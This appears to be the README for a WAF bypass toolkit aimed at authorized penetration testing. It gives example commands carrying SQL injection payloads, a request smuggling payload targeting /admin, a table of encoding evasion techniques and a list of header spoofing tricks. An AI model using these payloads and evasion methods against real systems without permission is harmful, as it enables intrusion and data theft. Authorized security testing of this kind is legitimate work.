# waf-bypass v1.0

WAF bypass toolkit buat authorized penetration testing.

## Perintah

```bash
python3 waf_bypass.py encode --payload "' OR 1=1--" --method double-url
python3 waf_bypass.py headers --target "http://target/search?q=test"
python3 waf_bypass.py chunked --payload "GET /admin HTTP/1.1\r\nHost: target\r\n"
python3 waf_bypass.py json --payload '{"id":"1 UNION SELECT * FROM users--"}'
python3 waf_bypass.py fuzz --param id --values "1,1',1`,2)1"
```

## Encoding Methods

| Method | Keterangan |
|---|---|
| `url` | Single URL encode |
| `double-url` | Double URL encode |
| `hex` | Hex encode per char |
| `unicode` | Unicode escape |
| `base64` | Base64 encode |
| `mixed` | Random hex/plain mix |
| `space2comment` | Spasi → `/**/` |
| `space2plus` | Spasi → `+` |
| `space2tab` | Spasi → tab |
| `newline` | Spasi → newline |
| `html-entities` | HTML numeric entities |
| `overlong-utf8` | Overlong UTF-8 |

## Header Bypass

- X-Forwarded-For / X-Real-IP / X-Originating-IP
- X-Original-URL / X-Rewrite-URL
- Bot UA (Googlebot, Bingbot)
- Debug headers

## Aturan pakai

- **Wajib** otorisasi tertulis / CTF scope
- Jangan produksi tanpa izin
- Output = attack artifact, jangan di-commit
